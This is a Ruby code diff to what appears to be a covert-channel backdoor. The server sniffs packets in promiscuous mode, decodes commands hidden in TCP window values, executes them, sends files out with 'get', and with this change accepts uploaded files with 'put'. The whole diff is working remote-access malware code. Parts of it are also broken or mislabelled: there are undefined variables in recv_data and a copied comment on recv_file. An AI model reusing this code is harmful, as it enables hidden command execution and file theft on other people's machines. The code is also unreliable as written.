@@ -38,12 +38,14 @@ def listen()
     
 				# if a FIN comes in then we have our complete command
 				if packet.tcp_flags.fin == 1 then
-                    puts command
+
                     commands = command.split(' ')
 
                     if commands[0] == "get" then
                         send_file(commands[1], packet)
-                        command = nil
+                        
+                    elsif commands[0] == "put" then
+                        recv_file(commands[1], packet)
                     else
                         exec_command(command, packet)
 
@@ -90,6 +92,67 @@ def exec_command(command, packet)
 	
 	listen()
 	
+end
+# -----------------------------------------------------------------------------------------
+#	recv_file(filename, packet)
+#    
+# Executes a command on the server, grabes the output and sends it back to the client.
+#
+# -----------------------------------------------------------------------------------------
+def recv_file(filename, packet)
+
+
+    content = recv_data(packet)
+
+    file = File.open(filename, 'wb')
+    content.each_byte do |c|
+        file.putc(c)
+    end
+    file.close()
+    puts "Recieved: #{filename}"
+    return
+
+end
+
+# -----------------------------------------------------------------------------------------
+#
+# recv_data()
+#
+# Waits for some data from the server (the output of a command) and returns it.
+# Optional argument to display it.
+#
+# -----------------------------------------------------------------------------------------
+def recv_data(packet)
+
+    data = nil
+    cap = PacketFu::Capture.new(:iface => @options[:iface], :start => true,
+                :promisc => true)    
+
+    cap.stream.each do | pkt |
+
+        if PacketFu::TCPPacket.can_parse?(pkt) then
+            packet = PacketFu::Packet.parse(pkt)
+            if packet.ip_daddr == packet.ip_saddr
+
+                if packet.tcp_flags.fin == 1 then
+                    
+                    return data
+                else
+                    if data.nil? then
+                            data = decode(packet.tcp_win)
+
+                    else #not nill
+                       data << decode(packet.tcp_win)                               
+                            
+                    end 
+            end #fin == 1
+          end #ptk.tcp_dst 
+        end #can_parse()
+    end #capture
+    
+    if display == true
+        puts output
+    end
 end
 # -----------------------------------------------------------------------------------------
 # Send a file back to the client
